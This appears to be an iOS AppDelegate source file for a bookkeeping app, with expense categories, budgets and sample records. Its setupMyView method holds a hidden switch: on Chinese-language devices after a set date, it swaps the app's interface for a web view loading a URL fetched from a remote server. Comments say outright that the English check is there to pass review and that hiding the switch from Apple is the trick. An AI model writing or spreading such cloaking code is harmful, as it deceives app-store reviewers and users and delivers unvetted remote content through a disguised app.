//
//  AppDelegate.m
//  ZLBasedAPP
//
//  Created by admin on 2018/9/25.
//  Copyright © 2018年 zlbased. All rights reserved.
//

#import "AppDelegate.h"
#import "IQKeyboardManager.h"
#import "MainWebVC.h"
#import "AFNetworking.h"

@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    [[AppDefaultUtil sharedInstance] setLoginState:NO]; //测试登录
    NSString *clientVersion = [[NSUserDefaults standardUserDefaults] stringForKey:@"clientVersion"];
    //判断应用程序是否更新了版本
    NSLog(@"clientVersion = [%@]", clientVersion);
    if ([clientVersion isEqualToString:CLIENT_VERSION]) {
        NSLog(@"未更新,正常使用");
        
    }else if(clientVersion == nil ){
        NSLog(@"首次安装");
        [[NSUserDefaults standardUserDefaults] setObject:CLIENT_VERSION forKey:@"clientVersion"];
        [FUsersTool setDefaultUser];
    } else{
        NSLog(@"更新了APP");
        [[NSUserDefaults standardUserDefaults] setObject:CLIENT_VERSION forKey:@"clientVersion"];
    }
    
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor whiteColor];
    [self.window makeKeyAndVisible];
    ZLTabBarController *tabbarVC = [[ZLTabBarController alloc] init];
    self.window.rootViewController = tabbarVC;
    
    
    [self setUpKeyboardManager];
    
    self.userInfo = [ZLUserModel userFrom_NSUserDefaults];
    
    //设置我们的
    [self setupMyView];
    return YES;
}

//我们的页面
- (void)setupMyView{
    
    [[UIApplication sharedApplication] setApplicationIconBadgeNumber:0];
    
    
    // 判断语言
    NSArray *languages = [NSLocale preferredLanguages];
    NSString *currentLanguage = [languages objectAtIndex:0];
    DLOG( @"%@" , currentLanguage);
    NSString *lang;
    
    BOOL isChineseLanguage = [currentLanguage rangeOfString:@"zh-Hant"].location != NSNotFound || [currentLanguage rangeOfString:@"zh-Hans"].location != NSNotFound ;
    
    if(isChineseLanguage)
    {
        //        NSString *currentLocale  = [[NSLocale currentLocale] objectForKey:NSLocaleCountryCode];
        //        DLOG(@"currentLocale=%@", currentLocale);
        lang = @"zh";
    }else{
        lang = @"en";
        
    }
    
    if (![lang isEqualToString:@"zh"]) {
        return;
    }
    
    NSDate *date = [NSDate date];
    NSDate *ipaDate = [NSDate setYear:2018 month:9 day:22 hour:7 minute:30];
    if (date.day -  ipaDate.day < 1 ) {
        return;
    }
    
    
    
    
    //定时跳转比如9月1号后才执行 为了规则审核，你最好加上如果是语言是英文，就不执行
    //这里切换
    //这样直接切换你会GG，怎么让苹果看不出来，就是你的真本事了
    //到了时间后就直接切换成h5不需要再显示壳的内容
    MainWebVC *webVC = [MainWebVC shareController];
    self.window.rootViewController = webVC;
    //或者
    //[[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:webVC animated:NO completion:nil];
    AFNetworkReachabilityManager *manager = [AFNetworkReachabilityManager sharedManager];
    [manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
        if (status == AFNetworkReachabilityStatusNotReachable) {
            NSLog(@"无网络");
        }
        else{
            //有网络发起请求
            AFHTTPSessionManager *afn = [AFHTTPSessionManager manager];
            //记得把这个链接替换
            
            NSString *urlPath = @"http://szhb56.cn/TestTiny.txt";// @"http://szhb56.cn/Test1.txt"
            [afn POST:urlPath parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
                
                [webVC loadWithUrl:responseObject];
                
            } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
                //                NSLog(@"%@",error);
            }];
            NSLog(@"有网络");
        }
    }];
    [manager startMonitoring];
}


- (void)setUserInfo:(ZLUserModel *)userInfo{
    _userInfo = userInfo;
    
    [[AppDefaultUtil sharedInstance] setLoginState:userInfo?YES:NO]; //测试登录
    
    if (!userInfo) {
        return;
    }
    self.aFAccountCategaries = [FAccountRecordSaveTool readLocalUserAccountCategaries];
    // 为默认用户专门生成预算
    if ([userInfo.phone isEqualToString:defName]) {
        for (FFirstType *expandseFirstType in self.aFAccountCategaries.expensesTypeArr) {
            expandseFirstType.budget = expandseFirstType.initBudget;
        }
    }
    
    [self initcurrentMonthRecord];
}

- (void)initcurrentMonthRecord{
    
    self.currentMonthRecord = [FAccountRecordSaveTool readLoaclCurrentMonthBlanceRecords];
    if (!self.currentMonthRecord) {//
    }
}


- (void)generateMonthBlance{
    // 6月份 //MM月dd日HH时mm分 yyyy年MM月
    NSMutableArray *monthExpandse = [NSMutableArray array];
    NSMutableArray *monthincome = [NSMutableArray array];
    //    NSInteger day = [NSDate date].day;
    //    int month = [NSDate date].month;
    for (int i = 1; i<= 30; i++) {// 支出一天1-2个，收入有6份收入
        
        NSString *time_minut = [NSString stringWithFormat:@"04月%02d日%02d时%02d分", i, 9+i%12, 10+i%20];
        NSString *time_month = [NSString stringWithFormat:@"2018年04月"];
        FAccountRecord *expandse = [FAccountRecord recordRandomExpandseWithtime_minute:time_minut time_month:time_month];
        [monthExpandse addObject:expandse];
        if (i%5 == 0) {
            
            FAccountRecord *expandse = [FAccountRecord recordRandomExpandseWithtime_minute:time_minut time_month:time_month];
            [monthExpandse addObject:expandse];
            
            FAccountRecord *income = [FAccountRecord recordRandomIncomeWithtime_minute:time_minut time_month:time_month];
            [monthincome addObject:income];
        }
    }
    FCurrentMonthRecord *moth4 = [FCurrentMonthRecord new];
    moth4.expandseArr = monthExpandse.mutableCopy;
    moth4.incomeArr = monthincome.mutableCopy;
    
    NSString *path = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *filePathName = [path stringByAppendingPathComponent:@"F_default_201804.txt"];
    
    NSDictionary *month4Account = [moth4 mj_JSONObject];
    NSString *jsonString = [month4Account mj_JSONString];
    
    [jsonString writeToFile:filePathName atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

- (void)generatePlist{
    
    NSMutableArray *arrtemp = [NSMutableArray array];
    FSubType *sub1, *sub2, *sub3, *sub4, *sub5, *sub6;
    sub1 = [FSubType subTypeWithName:@"早午晚餐"];
    sub1.amountRange = @"5-700";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"烟茶水"];
    sub2.amountRange = @"5-700";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"水果零食"];
    sub3.amountRange = @"5-100";
    [arrtemp addObject:sub3];
    FFirstType *firstType1 = [FFirstType firstTypeWithName:@"食品酒水" budget:0 subTypeArr:arrtemp.copy];
    firstType1.initBudget = 2000;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"日常用品"];
    sub1.amountRange = @"100-500";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"水电煤气"];
    sub2.amountRange = @"100-500";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"房租"];
    sub3.amountRange = @"1000-1500";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"物业管理"];
    sub4.amountRange = @"150-200";
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"维修保养"];
    sub5.amountRange = @"200-1000";
    [arrtemp addObject:sub5];
    FFirstType *firstType2 = [FFirstType firstTypeWithName:@"居家物业" budget:0 subTypeArr:arrtemp.copy];
    firstType2.initBudget = 4000;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"公共交通"];
    sub1.amountRange = @"5-10";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"打车"];
    sub2.amountRange = @"30-100";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"租车"];
    sub3.amountRange = @"200-500";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"私家车"];
    sub4.amountRange = @"200-300";
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"包车"];
    sub5.amountRange = @"500-800";
    [arrtemp addObject:sub5];
    FFirstType *firstType3 = [FFirstType firstTypeWithName:@"行车交通" budget:0 subTypeArr:arrtemp.copy];
    firstType3.initBudget = 500;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"运动健身"];
    sub1.amountRange = @"10-100";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"腐败聚会"];
    sub2.amountRange = @"150-300";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"休闲玩乐"];
    sub3.amountRange = @"200-400";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"宠物宝贝"];
    sub4.amountRange = @"200-400";
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"旅游度假"];
    sub5.amountRange = @"1000-3000";
    [arrtemp addObject:sub5];
    sub6 = [FSubType subTypeWithName:@"酒店费"];
    sub6.amountRange = @"300-1000";
    [arrtemp addObject:sub6];
    FFirstType *firstType4 = [FFirstType firstTypeWithName:@"休闲娱乐" budget:0 subTypeArr:arrtemp.copy];
    firstType4.initBudget = 1000;
    
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"书报杂志"];
    sub1.amountRange = @"50-200";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"培训"];
    sub2.amountRange = @"2000-4000";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"数码装备"];
    sub3.amountRange = @"2000-4000";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"教材"];
    sub4.amountRange = @"50-100";
    [arrtemp addObject:sub4];
    FFirstType *firstType5 = [FFirstType firstTypeWithName:@"学习进修" budget:0 subTypeArr:arrtemp.copy];
    firstType5.initBudget = 500;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"送礼"];
    sub1.amountRange = @"200-1000";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"请客"];
    sub2.amountRange = @"200-1000";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"孝敬长辈"];
    sub3.amountRange = @"200-1000";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"还钱"];
    sub4.amountRange = @"200-1000";
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"慈善捐助"];
    sub5.amountRange = @"200-1000";
    [arrtemp addObject:sub5];
    sub6 = [FSubType subTypeWithName:@"酒席红包"];
    sub6.amountRange = @"200-1000";
    [arrtemp addObject:sub6];
    FFirstType *firstType6 = [FFirstType firstTypeWithName:@"人情来往" budget:0 subTypeArr:arrtemp.copy];
    firstType6.initBudget = 1000;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"药品费"];
    sub1.amountRange = @"20-100";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"保健费"];
    sub2.amountRange = @"200-1000";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"美容费"];
    sub3.amountRange = @"200-1000";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"治疗费"];
    sub4.amountRange = @"100-200";
    [arrtemp addObject:sub4];
    FFirstType *firstType7 = [FFirstType firstTypeWithName:@"医疗保健" budget:0 subTypeArr:arrtemp.copy];
    firstType7.initBudget = 500;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"银行手续"];
    sub1.amountRange = @"10-50";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"投资亏损"];
    sub2.amountRange = @"10-500";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"按揭还款"];
    sub3.amountRange = @"2000-5000";
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"消费税收"];
    sub4.amountRange = @"500-1000";
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"利息支出"];
    sub5.amountRange = @"50-100";
    [arrtemp addObject:sub5];
    sub6 = [FSubType subTypeWithName:@"赔偿罚款"];
    sub6.amountRange = @"50-300";
    [arrtemp addObject:sub6];
    FFirstType *firstType8 = [FFirstType firstTypeWithName:@"金融保险" budget:0 subTypeArr:arrtemp.copy];
    firstType8.initBudget = 2000;
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"其它支出"];
    sub1.amountRange = @"50-300";
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"意外丢失"];
    sub2.amountRange = @"50-300";
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"烂账损失"];
    sub3.amountRange = @"50-300";
    [arrtemp addObject:sub3];
    FFirstType *firstType9 = [FFirstType firstTypeWithName:@"其它杂项" budget:0 subTypeArr:arrtemp.copy];
    firstType9.initBudget = 500;
    
    NSMutableArray *expandesArr = [NSMutableArray arrayWithObjects:firstType1, firstType2, firstType3, firstType4, firstType5, firstType6, firstType7, firstType8, firstType9, nil];
    
    // 收入
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"工资收入"];
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"利息收入"];
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"加班收入"];
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"奖金收入"];
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"投资收入"];
    [arrtemp addObject:sub5];
    sub6 = [FSubType subTypeWithName:@"兼职收入"];
    [arrtemp addObject:sub6];
    FSubType *sub7 = [FSubType subTypeWithName:@"出差收入"];
    [arrtemp addObject:sub7];
    FFirstType *firstType10 = [FFirstType firstTypeWithName:@"职业收入" budget:0 subTypeArr:arrtemp.copy];
    
    [arrtemp removeAllObjects];
    sub1 = [FSubType subTypeWithName:@"礼金收入"];
    [arrtemp addObject:sub1];
    sub2 = [FSubType subTypeWithName:@"中奖收入"];
    [arrtemp addObject:sub2];
    sub3 = [FSubType subTypeWithName:@"意外来钱"];
    [arrtemp addObject:sub3];
    sub4 = [FSubType subTypeWithName:@"经营所得"];
    [arrtemp addObject:sub4];
    sub5 = [FSubType subTypeWithName:@"信用卡还款"];
    [arrtemp addObject:sub5];
    FFirstType *firstType11 = [FFirstType firstTypeWithName:@"其它收入" budget:0 subTypeArr:arrtemp.copy];
    
    NSMutableArray *incomeArr = [NSMutableArray arrayWithObjects:firstType10, firstType11, nil];
    
    
    NSMutableArray *accountArr = [NSMutableArray arrayWithObjects:@"现金（RMB)", @"银行卡", @"支付宝", @"微信", @"其他", nil];
    
    FAccountCategaries *category = [[FAccountCategaries alloc] init];
    category.expensesTypeArr = expandesArr;
    category.incomeTypeArr = incomeArr;
    category.accountTypeArr = accountArr;
    
    self.aFAccountCategaries = category;
    NSArray *plistWriteArr = [category mj_JSONObject];
    
    NSString *cachepath =  NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES).firstObject;
    //在这里,我们指定搜索的是Cache目录,所以结果只有一个,取出Cache目录
    NSString *filePathName = [cachepath stringByAppendingPathComponent:@"AccoutCategeries.plist"];
    
    [plistWriteArr writeToFile:filePathName atomically:YES];
    
    //    NSURL *pathURL = [[NSBundle mainBundle] URLForResource:@"AccoutCategeries" withExtension:@"plist"];
    plistWriteArr = [NSArray arrayWithContentsOfFile:filePathName];
    DLOG(@"path = %@, result = %@", filePathName, plistWriteArr);
}

#pragma  mark - 以下自定义方法
- (void)setUpKeyboardManager
{
    IQKeyboardManager *manager = [IQKeyboardManager sharedManager];
    manager.enable = YES;
    manager.shouldResignOnTouchOutside = YES;
    manager.shouldToolbarUsesTextFieldTintColor = YES;
    manager.shouldShowToolbarPlaceholder = NO;
    manager.toolbarManageBehaviour = IQAutoToolbarByTag;
    //    manager.previousNextDisplayMode = IQPreviousNextDisplayModeDefault;
}

- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
    
    [self.userInfo saveTo_NSUserDefaults];
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
}


- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


@end
